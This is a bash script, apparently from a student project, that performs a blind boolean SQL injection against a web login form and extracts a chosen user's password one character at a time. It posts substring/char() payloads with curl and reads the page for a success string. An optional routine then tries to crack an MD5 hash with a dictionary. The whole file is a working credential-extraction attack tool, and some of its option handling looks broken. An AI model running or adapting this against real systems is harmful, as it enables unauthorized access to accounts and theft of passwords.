#!/usr/bin/env bash
#
#	Auteur 	: P. Boris
#	Cadre	: Projet tuteuré
#	Licence 	: WTFPL
#
##########################################

######### COLOR ##########
V="\\033[1;32m"
N="\\033[0;39m"
R="\\033[1;31m"
##########################

_usage(){
	echo -e "Usage: $0 ${R}url ${V}username${N} <option:-md5>"
	exit 1
}

_sqli(){
	local i USER="$2" URL="$1"
	echo $URL
	for(( i=1 ; i<100 ; i++)); do
		for LETTER in {33..126}; do
				SQLI="1' OR substring((SELECT password FROM users WHERE login='$USER'),$i,1)=char($LETTER)#"
				curl -s -d "username=guest&passwd=$SQLI" "$URL" |grep "Bien" &> /dev/null && \
				{
					echo -n "$LETTER "
					PASS[ $((i-1)) ]=$LETTER
					break
				}
		done
		[ -z "${PASS[0]}" ] && \
		{
			echo -e "${R}[!] Username not found${N} or SQLi failed"
			exit 1
		}
		[ -z "${PASS[$((i-1))]}" ] && \
		{
			echo ; _ascii2txt
			break
		}
	done
}

_ascii2txt(){
	local index
	for CAR in ${PASS[@]}; do
		RES[$index]=$(printf \\$(printf '%03o' $CAR))
		: $((index++))
	done
	RES=${RES[*],,}
	RES=${RES// /}

	echo -e "${V}Passwd pwn(ascii):${N} $RES"
}

_crackmd5(){
	for WORD in $(look .|grep ^a); do
		MD5=$(echo -n "$WORD"|md5sum|awk '{print $1}')
		if [[ "$MD5" == "$RES" ]]; then
			echo "${V}PWN ! Pass valid :${N} $WORD"
			exit 0
		fi
	done
}


##############################
########## [ MAIN ] ##########
##############################

[ "$#" -ne 2 ] && _usage
if [[ "$1" =~ [a-z] ]]; then
	URL="$1"
	USERNAME="$2"
	shift
	_sqli "$URL" "$USERNAME"
fi
#_ascii2txt
if [ "$1" == "-md5" ]; then
	_crackmd5
fi
exit 0
